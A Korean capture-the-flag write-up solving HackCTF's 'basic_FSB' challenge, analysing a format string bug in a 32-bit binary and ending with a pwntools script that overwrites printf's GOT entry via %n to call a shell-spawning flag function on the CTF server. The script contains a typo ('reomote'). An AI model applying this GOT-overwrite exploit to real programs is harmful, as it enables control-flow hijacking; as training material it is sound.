# HackCTF - basic_FSB

---

![image](https://user-images.githubusercontent.com/33051018/71477083-77fd1180-282b-11ea-91c3-7efb11f9fce9.png)

HackCTF 의 **Basic_FSB**문제다.

문제명에서 알 수 있듯, `Format String Bug` 취약점을 이용하는 문제로 에상된다.

바로 풀어보도록 한다.



#### 문제풀이

---

>바이너리를 다운받고 문제를 풀 환경으로 복사한다.
>
>![image](https://user-images.githubusercontent.com/33051018/71477133-abd83700-282b-11ea-96e4-a7bc9b816898.png)
>
>해당 문제는 32bit ELF 파일이며, 동적 링크방식을 이용한다.
>
>![image](https://user-images.githubusercontent.com/33051018/71477341-cf4fb180-282c-11ea-8e04-c75d14869fb0.png)
>
>또한 아무런 보호기법도 적용되지 않았다.
>
>![image](https://user-images.githubusercontent.com/33051018/71477371-eababc80-282c-11ea-9e7e-968df2a6366b.png)
>
>일단 실행을 시켜보았다.
>
>`input :` 이라는 문자열을 출력한 뒤 ,값을 입력받고 해당 값을 재출력해준다.
>
>![image](https://user-images.githubusercontent.com/33051018/71477414-366d6600-282d-11ea-80f1-e2b13188daac.png)
>
>메인 구성은 매우 간단했다.
>
>버퍼를 설정한 뒤, `vuln()` 함수를 호출한다.
>
>![image](https://user-images.githubusercontent.com/33051018/71477425-4be29000-282d-11ea-8f6d-78dd976137ab.png)
>
>앞서 실행했을 때 확인할 수 있었던 `input : `이라는 문자열을 출력한뒤
>
>1024 바이트의 길이만큼 입력받아 `s`변수에 저장한다.
>
>`snprintf` 함수의 메뉴얼은 아래와 같다.
>
>![image](https://user-images.githubusercontent.com/33051018/71477447-7cc2c500-282d-11ea-813e-412e00bf678d.png)
>
>`snprintf`를 통해 값을 `0x400`크기 만큼 입력받고, `return`을 할 때 이용되는 함수가 `printf`함수임을 알 수 있다.
>
>따라서 우리는`return addr`를 조작하여 printf 함수가 실행되는 부분의 흐름을 조작할 수 있다.
>
>또한, `flag`라는 이름을 가진 함수도 발견할 수 있었다.![image](https://user-images.githubusercontent.com/33051018/71477494-ce6b4f80-282d-11ea-8a04-80e6da3b4c68.png)
>
>일련의 문자열을 출력한 뒤, 쉘을 열어준다.
>
>![image](https://user-images.githubusercontent.com/33051018/71477546-fa86d080-282d-11ea-8faa-ee42b0e3f65b.png)
>
>해당 함수의 위치는 `0x80485B4` 였다.
>
>시나리오는 아래와 같다.
>
>>1. Format String의 현재 커서 위치를 확인한다.
>>2. printf got값을 입력하여 flag 주소값 크기만큼 출력한다.
>>3. printf got를 입력한 부분을 가리키는 부분에 %n을 입력하여 출력한 바이트 수를 넣어준다.
>>4. 그 이후 printf가 실행될 시점에 flag가 실행된다.
>
>
>
>일단 Format String의 위치를 확인하도록 한다.
>
>![image](https://user-images.githubusercontent.com/33051018/71477712-cfe94780-282e-11ea-8e2e-efc20d43ae7b.png)
>
>파일을 실행시키고 `aaaa %p %p %p %p %p`를 전달하였더니, 
>
>두번째 포맷스트링에서 입력한 값이 출력되는걸 알 수 있다.
>
>**즉, 두번째에 들어가는 포맷스트링에는 처음 입력한 4바이트를 포인팅한다는 것을 알 수 있다.**
>
>그렇다면 첫번째 인자를 이용해 flag의 주소 값 만큼 출력하고 두번째 인자로 %n을 이용해 값을 넣을수 있도록 조정한다.
>
>```python
>from pwn import *
>p = reomote('ctf.j0n9hyun.xyz', 3002)
>#p = process('./basic_fsb')
>
>flag = 0x80485B4
>printf_got = 0x804A00C
>
>payload = p32(printf_got)
>payload += '%134514096x' # hex to dec(flag)
>payload += '%n'
>
>p.recvuntil('input :')
>p.sendline(payload)
>
>p.interactive()
>```
>
>
>
>![image](https://user-images.githubusercontent.com/33051018/71478370-90bcf580-2832-11ea-8a1e-4bfbc833bb62.png)
>
>